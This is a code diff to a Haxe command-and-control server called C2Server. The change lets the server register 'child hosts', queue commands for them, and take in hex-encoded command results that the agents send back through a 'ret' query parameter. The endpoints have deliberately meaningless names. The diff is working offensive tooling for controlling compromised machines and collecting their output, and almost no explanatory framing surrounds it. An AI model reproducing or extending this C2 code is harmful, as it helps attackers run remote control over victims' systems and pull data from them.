@@ -3,11 +3,12 @@ import tink.http.Response;
 import tink.Url;
 import tink.url.Query;
 using tink.CoreApi;
+using haxe.io.Bytes;
 
 class C2Server {
     static var codes_tables:Map<String, String> = [];
     static var command_tables:Map<String, Array<String>> = [];
-    static var result_tables:Map<String, Array<String>> = [];
+    static var return_tables:Map<String, Array<String>> = [];
 
     static function main() {
         var container = new NodeContainer(8000);
@@ -31,26 +32,37 @@ class C2Server {
     }
 
     static function statusPath(req) {
-        return 'code_tables: ${C2Server.codes_tables}\n command_tables: ${C2Server.command_tables}\n';
+        return 'status:
+    code_tables: ${C2Server.codes_tables}
+    command_tables: ${C2Server.command_tables}
+    return_tables: ${C2Server.return_tables}\n';
     }
 
     static function asdfPath(req) {
         var url:Url = req.header.url;
         var q = url.query.toMap();
         var code = q['code'];
+        var ret = q['ret'];
 
-        if (C2Server.command_tables.exists(code)) {
-            return 'code already exists!';
+        if (!C2Server.command_tables.exists(code)) {
+            var n = [ for (k in C2Server.codes_tables.keys()) k ].length;
+            var id = 'z-${n}';
+            C2Server.codes_tables[id] = code;
+            C2Server.command_tables[code] = [];
+            C2Server.return_tables[code] = [];
+            Sys.println('added child host: ${code} => ${C2Server.codes_tables[id]}');
         }
 
-        var n = [ for (k in C2Server.codes_tables.keys()) k ].length;
-        var id = 'z-${n}';
-        C2Server.codes_tables[id] = code;
-        C2Server.command_tables[code] = [];
-        C2Server.result_tables[code] = [];
-        Sys.println('added child host: ${code} => ${C2Server.codes_tables[id]}');
+        if (ret != null && ret != "") {
+            var ret_list:String = ret;
+            var parsed_list = ret_list.split(',');
+            var parsed_list2 = parsed_list.map(s -> Bytes.ofHex(s).toString());
+            for (ret_s in parsed_list2) {
+                C2Server.return_tables[code].push(ret_s);
+            }
+        }
 
-        return 'qwerty: ${C2Server.codes_tables}';
+        return C2Server.zxcvPath(req);
     }
 
     static function zxcvPath(req) {
@@ -64,7 +76,7 @@ class C2Server {
 
         var coms = C2Server.command_tables[code];
         C2Server.command_tables[code] = [];
-        return 'coms: ${coms}';
+        return 'coms: [${coms.join(",")}]';
     }
 
     static function comstarPath(req) {
